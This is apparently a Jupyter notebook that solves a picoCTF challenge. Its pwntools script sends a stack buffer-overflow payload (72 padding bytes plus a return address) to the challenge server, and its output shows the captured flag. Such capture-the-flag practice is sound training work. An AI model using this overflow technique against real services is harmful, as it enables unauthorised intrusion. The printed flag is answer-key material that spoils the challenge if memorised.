{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to saturn.picoctf.net on port 54291\n",
      "[x] Opening connection to saturn.picoctf.net on port 54291: Trying 13.59.203.175\n",
      "[+] Opening connection to saturn.picoctf.net on port 54291: Done\n",
      "[x] Receiving all data\n",
      "[x] Receiving all data: 1B\n",
      "[x] Receiving all data: 35B\n",
      "[+] Receiving all data: Done (35B)\n",
      "[*] Closed connection to saturn.picoctf.net port 54291\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\npicoCTF{b1663r_15_b3773r_47a99eda}'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from pwn import ELF, context, remote, FmtStr, fmtstr_payload, p64\n",
    "import re\n",
    "r = remote('saturn.picoctf.net', 54291)\n",
    "r.recvuntil(b'Welcome to 64-bit. Give me a string that gets you the flag: ')\n",
    "r.sendline(b\"a\"*72+p64(0x0040123b))\n",
    "r.recvall()\n",
    "# 0040123a"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
